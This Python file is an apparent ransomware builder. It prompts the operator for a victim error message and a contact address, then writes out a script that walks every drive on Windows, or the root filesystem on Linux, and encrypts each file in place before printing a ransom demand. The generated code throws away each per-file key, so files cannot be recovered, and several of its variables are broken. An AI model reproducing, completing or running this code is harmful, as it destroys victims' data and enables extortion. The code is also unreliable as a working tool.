import os
import time
from cryptography.fernet import Fernet
from colorama import Fore


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    banner = '''
          _______           _______  _______         _______  _        _______  _______           _______ _________
|\     /|(  ___  )|\     /|(  ___  )(  ____ \       (  ____ \( (    /|(  ____ \(  ____ )|\     /|(  ____ )\__   __/
( \   / )| (   ) || )   ( || (   ) || (    \/       | (    \/|  \  ( || (    \/| (    )|( \   / )| (    )|   ) (   
 \ (_) / | (___) || | _ | || |   | || (_____  _____ | (__    |   \ | || |      | (____)| \ (_) / | (____)|   | |   
  \   /  |  ___  || |( )| || |   | |(_____  )(_____)|  __)   | (\ \) || |      |     __)  \   /  |  _____)   | |   
   ) (   | (   ) || || || || |   | |      ) |       | (      | | \   || |      | (\ (      ) (   | (         | |   
   | |   | )   ( || () () || (___) |/\____) |       | (____/\| )  \  || (____/\| ) \ \__   | |   | )         | |   
   \_/   |/     \|(_______)(_______)\_______)       (_______/|/    )_)(_______/|/   \__/   \_/   |/          )_(   
                                                                                                                   

                            github : https://github.com/yawoss35      

'''
    print(f"{Fore.MAGENTA}{banner}{Fore.RESET}")


banner()


filename = input(f"{Fore.YELLOW}Enter file name: {Fore.RESET}")
errormsg = input(f"{Fore.YELLOW}If the code does not work, the error message that will appear on the victim's screen: {Fore.RESET}")
addres = input(f"{Fore.YELLOW}Leave an address where the victim can reach you: {Fore.RESET}")
time.sleep(1)
clear()


key = Fernet.generate_key()
with open("malware.key", "wb") as dangerkey:
    dangerkey.write(key)

    
print(f"{Fore.YELLOW}Key file created in your directory.{Fore.RESET}")
time.sleep(1)
clear()


code = f'''
import os
import platform
import psutil  
from cryptography.fernet import Fernet
import time


def encrypt_file(filename):
    with open(filename, "rb") as file:
        contents = file.read()
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    encrypted_contents = cipher_suite.encrypt(contents)
    with open(filename, "wb") as file:
        file.write(encrypted_contents)
    return key


def encrypt_directory(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            encrypt_file(filepath)


def main():
    if platform.system() == "Windows":
        drives = [drive.device for drive in psutil.disk_partitions() if 'cdrom' not in drive.opts]
        for drive in drives:
            encrypt_directory(drive)
    elif platform.system() == "Linux":
        root_directory = "/"  
        encrypt_directory(root_directory)
    else:
        print(errormsg)

time.sleep(1)
print("All your files have been encrypted and you can contact me at the following address for decryption:")
print(addres)


if __name__ == "__main__":
    main()
'''


with open(filename + ".py", "w") as file:
    file.write(code)


print(f"{Fore.YELLOW}Python code has been successfully saved to {filename}.py.{Fore.RESET}")

